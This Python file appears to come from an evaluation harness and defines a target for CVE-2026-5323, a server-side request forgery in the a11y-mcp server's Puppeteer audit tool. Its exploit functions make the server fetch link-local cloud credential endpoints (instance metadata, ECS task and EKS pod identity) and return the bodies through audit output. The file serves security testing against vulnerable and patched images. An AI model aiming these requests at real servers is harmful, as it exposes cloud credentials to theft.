"""CVE-2026-5323: a11y-mcp server-side request forgery via Puppeteer (CWE-918).

The audit_webpage and get_summary tools pass args.url straight into Puppeteer
page.goto({waitUntil:'networkidle2'}) with no scheme or host validation (A11yServer in
src/index.js, a11y-mcp 1.0.4). The server's headless Chrome fetches any caller-chosen internal
address, axe-core audits the loaded DOM and the fetched body surfaces in the violation nodes' html
field (includeHtml=true): reach = internal_fetch. The first patched release (1.0.5) resolves each
host and rejects loopback and private / link-local ranges (169.254/16 among them) before page.goto,
so no nonce surfaces and the public benign audit still succeeds.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import ssrf_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Place, Places
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

# An exploit URL names a link-local address (169.254/16); the benign audit of a public page does
# not, so the aim separates the two.
AIM = re.compile(r"169\.254\.")

KEPT_PLACES: tuple[str, ...] = ("imds", "ecs-task-credentials", "eks-pod-identity")


def _url(place: Place) -> str:
    return f"http://{place.coordinates.host}{place.coordinates.path}"


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        await client.call_tool(
            "audit_webpage", {"url": _url(places[place_id]), "includeHtml": True}
        )

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    # A legitimate accessibility audit of a public page: allowed by the patch, carries no nonce.
    await client.call_tool("audit_webpage", {"url": "http://example.com/", "includeHtml": True})


TARGET = CVETarget(
    cve_id="CVE-2026-5323",
    severity="CVSS 7.5 (v3.1, placeholder)",
    mechanism=MechanismClass.INTERNAL_FETCH,
    aim=AIM,
    reaches=frozenset({"internal_fetch"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2026-5323-a11y", "sentinel"),
    server_image="holdout-2026-5323-a11y",
    patched_image="holdout-2026-5323-a11y-patched",
    # cwd /tmp, not /srv/app: Puppeteer's cosmiconfig config walk stats the cwd and its parents, and
    # the unprivileged user gets EACCES on the host-owned read-only /srv mount, so node would exit
    # before tools/list. The SSRF server reads nothing from /srv and only needs network egress.
    planting_host=PlantingHost(
        user=SymbolicUser.UNPRIVILEGED, working_directory="/tmp", has_network=True
    ),
    builder=ssrf_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "SSRF (CWE-918): audit_webpage drives Puppeteer page.goto to any caller-chosen URL with no "
        "validation, so the headless Chrome fetches a link-local / cloud-metadata address and "
        "axe-core returns its body."
    ),
    tools_filter=None,
)
